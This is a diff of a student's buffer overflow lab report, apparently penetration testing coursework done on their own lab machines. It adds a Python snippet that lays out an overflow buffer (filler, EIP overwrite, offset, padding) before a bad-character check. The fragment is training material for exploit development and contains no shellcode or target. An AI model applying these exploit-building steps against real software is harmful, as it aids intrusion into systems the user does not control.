@@ -128,6 +128,13 @@ _(To be performed on your own Kali and Windows lab client machines - Reporting i
 
 1.  Repeat the required steps in order to identify the bad characters that cannot be included in the payload.
 First we must extend our initial buffer in order to allow more space for the shell code. We simply increase our buffer from 800 to 1500 with the following snippet:
+```python
+filler = "A" * 780
+eip = "B" * 4
+offset = "C" * 4
+buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
 
+inputBuffer = filler + eip + offset + buffer
+```
 
 2.  Why are these characters not allowed? How do these bad hex characters translate to ASCII?
